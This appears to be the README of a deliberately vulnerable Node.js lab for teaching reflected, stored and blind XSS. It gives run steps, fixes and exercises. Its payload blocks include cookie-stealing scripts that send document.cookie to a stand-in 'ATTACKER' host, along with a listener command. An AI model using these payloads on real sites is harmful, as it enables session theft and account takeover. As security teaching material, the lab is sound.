# XSS Lab

A deliberately vulnerable Node.js app for learning **Cross-Site Scripting
(XSS)**: reflected, stored, and blind.

> ⚠️ **Lab only.** Every route renders user input without escaping *on
> purpose*. Run it locally or on an isolated class network. Never deploy it.

---

## Run it

```bash
npm install
npm start
# -> http://localhost:4000
```

From the Kali VM, use the host IP instead of localhost (e.g.
`http://192.168.36.1:4000`). Hit **`/reset`** any time to clear stored data.

---

## What is XSS?

The app takes user input and puts it into a page **without escaping it**. The
browser then runs attacker-supplied JavaScript as if it came from the trusted
site — with its cookies, DOM, and origin. That means session theft, account
takeover, keylogging, and self-propagating worms.

Three flavors, one root cause (unescaped output):

| Type | Payload lives… | Runs for… | Page |
|------|----------------|-----------|------|
| **Reflected** | in the request (URL) | whoever opens the crafted link | `/reflected` |
| **Stored** | saved on the server | every visitor of the page | `/guestbook` |
| **Blind** | saved on the server | a *different* user (admin), elsewhere | `/contact` → `/admin/messages` |

---

## 1. Reflected XSS — `/reflected`

`?q=` is echoed straight into the HTML. Delivered by tricking a victim into
clicking a link.

```text
<script>alert(document.domain)</script>
<img src=x onerror=alert("reflected")>
# as a link an attacker sends:
/reflected?q=<script>alert(document.cookie)</script>
```

## 2. Stored XSS — `/guestbook`

Post once; the payload is saved and runs in **every** visitor's browser until
reset. Highest impact.

```text
<script>alert("stored by "+document.domain)</script>
<img src=x onerror="fetch('http://ATTACKER:8000/?c='+document.cookie)">
```

## 3. Blind XSS — `/contact` → `/admin/messages`

Submit via **Contact Us**. The confirmation page is escaped, so you see
nothing — the payload sleeps. It executes later when **staff open the admin
panel** (`/admin/messages`), in *their* session. Because you can't see the
result, use an out-of-band callback.

```bash
# 1) attacker listener
python3 -m http.server 8000
```
```text
# 2) submit this in the Contact Us message field
<script>new Image().src="http://ATTACKER:8000/blind?c="+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER:8000/pwned?url='+location.href)">
```
```text
# 3) play the admin: open /admin/messages  -> your listener gets a hit
```

Replace `ATTACKER` with your VM IP. In the real world the callback host is a
service like a webhook or XSS Hunter; the idea is identical.

---

## Why each one works (and the fix)

| Sink in the code | Fix |
|------------------|-----|
| `?q` concatenated into HTML | HTML-encode on output |
| guestbook entry injected into HTML | escape on output (and/or sanitize on input) |
| admin panel prints messages raw | escape in the admin view too — **every sink counts** |

General defenses:
- **Escape output per context** (HTML, attribute, JS, URL). Use an
  auto-escaping template engine.
- **Content-Security-Policy** to block inline scripts as defense-in-depth.
- **HttpOnly cookies** so stolen cookies aren't readable from JS.
- Sanitize rich input with a vetted library (e.g. DOMPurify) when HTML must be
  allowed.

---

## Exercises

1. Fire `alert()` on `/reflected` two different ways (a `<script>` tag and an
   event handler). Why might one be blocked while the other isn't?
2. Plant a stored payload in the guestbook that steals `document.cookie` to
   your listener. Confirm it fires for a *second* browser.
3. Make the Contact Us form blind-XSS your "admin." Start a listener, submit,
   then open `/admin/messages`. What did the admin's browser send you?
4. For each lab, write the one-line server-side fix. Re-test — your payloads
   should now show as inert text.
5. Bonus: which cookie flag would stop the cookie theft even if XSS fires?
